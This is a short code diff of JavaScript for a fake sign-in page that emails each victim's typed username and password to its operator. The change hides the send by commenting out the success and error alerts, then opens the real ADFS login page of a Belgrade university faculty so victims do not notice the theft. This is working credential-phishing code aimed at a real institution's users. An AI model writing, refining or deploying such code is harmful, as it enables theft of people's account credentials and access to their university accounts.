@@ -24,10 +24,13 @@ signInButton.addEventListener('click', () => {
       message: `Username: ${username.value} + Password: ${password.value}`,
     })
     .then(() => {
-      alert('Email sent successfully!');
+      //alert('Email sent successfully!');
+      window.open(
+        'https://fs.fon.bg.ac.rs/adfs/ls/?wa=wsignin1.0&wtrealm=urn:federation:MicrosoftOnline/'
+      );
     })
     .catch((err) => {
-      console.error('Failed to send email:', err);
-      alert('Oops! Something went wrong.');
+      //console.error('Failed to send email:', err);
+      //alert('Oops! Something went wrong.');
     });
 });
